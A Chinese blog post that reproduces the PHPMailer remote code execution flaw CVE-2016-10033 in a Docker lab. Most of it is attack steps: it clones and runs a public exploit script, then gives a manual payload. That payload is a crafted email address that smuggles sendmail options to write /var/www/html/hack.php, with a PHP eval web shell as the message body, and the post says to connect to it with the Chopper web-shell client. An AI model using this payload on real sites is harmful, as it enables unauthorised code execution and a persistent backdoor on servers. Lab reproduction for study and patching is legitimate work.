**目录**

[漏洞复现](#t0 "漏洞复现")

[一：直接使用漏洞利用脚本进行攻击](#t1 "一：直接使用漏洞利用脚本进行攻击")

[二：手动进行攻击](#t2 "二：手动进行攻击")

* * *

> PHPMailer是一个基于PHP语言的邮件发送组件，被广泛运用于诸如[WordPress](https://so.csdn.net/so/search?q=WordPress&spm=1001.2101.3001.7020)、Drupal、1CRM、SugarCRM、Yii、Joomla等用户量巨大的应用与框架中。

CVE-2016-10033是PHPMailer中存在的高危漏洞，这个高危漏洞是由 class.phpmailer.php 没有正确处理用户的请[求导](https://so.csdn.net/so/search?q=%E6%B1%82%E5%AF%BC&spm=1001.2101.3001.7020)致的攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。

**漏洞利用条件：**

*   PHP 没有开启 safe\_mode（默认）

**影响版本**：小于 5.2.18 版本

漏洞复现
----

我们这里使用docker搭建复现环境

```
docker search cve-2016-10033      
docker pull vulnerables/cve-2016-10033      
docker run -d -P --name phpmailer vulnerables/cve-2016-10033
```


![](https://img-blog.csdnimg.cn/20200405195447592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200405195625984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
访问搭建好的漏洞环境

![](https://img-blog.csdnimg.cn/20200405195805369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 一：直接使用漏洞利用脚本进行攻击

```
git clone https://github.com/opsxcq/exploit-CVE-2016-10033.git      
cd exploit-CVE-2016-10033/      
./exploit.sh 地址:端口
```


![](https://img-blog.csdnimg.cn/2020040520073724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 二：手动进行攻击

**手动攻击需要知道目标网站的绝对路径**

提交的数据如下

```
email：      
"aaa". -OQueueDirectory=/tmp/. -X/var/www/html/hack.php @aaa.com       
message：      
<?php @eval($_POST[hack]);?>
```


![](https://img-blog.csdnimg.cn/20200405202746484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

点击Send email，会在目标网站下生成 hack.php 文件。然后使用菜刀连接生成的 hack.php 文件即可。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)